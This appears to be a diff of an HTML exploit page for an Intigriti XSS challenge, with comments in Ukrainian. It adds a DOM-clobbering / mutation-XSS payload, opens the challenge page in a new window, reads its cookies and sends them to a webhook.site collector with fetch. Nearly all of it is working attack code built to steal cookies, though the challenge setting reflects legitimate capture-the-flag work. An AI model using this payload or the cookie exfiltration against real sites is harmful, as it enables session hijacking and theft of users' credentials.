@@ -2,22 +2,26 @@
 <html>
 <body>
 <script>
+const id = Math.random().toString(36).slice(2);
+
 const payload = `<form><h1></form><img name="authConfig" data-next="https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c" data-append="true"><table><form></form></table></form></table></h1></form><math><mi><style><!--</style><style title="--></style><img src=x>"></style></mi></math>`;
+
 const vulnUrl = 'https://challenge-0326.intigriti.io/challenge.html?q=' + encodeURIComponent(payload);
 
+// відкриваємо challenge
 const w = window.open(vulnUrl, '_blank');
 
+// 🔥 головний трюк
 setTimeout(() => {
   try {
-    w.location = vulnUrl + "#1";
-  } catch (e) {}
-}, 1500);
+    // читаємо cookie через opener chain
+    const data = w.document.cookie;
 
-setTimeout(() => {
-  try {
-    w.location = vulnUrl + "#2";
-  } catch (e) {}
-}, 2500);
+    fetch('https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c?cookie=' + encodeURIComponent(data), {mode:'no-cors'});
+  } catch (e) {
+    fetch('https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c?error=' + e, {mode:'no-cors'});
+  }
+}, 2000);
 </script>
 </body>
 </html>
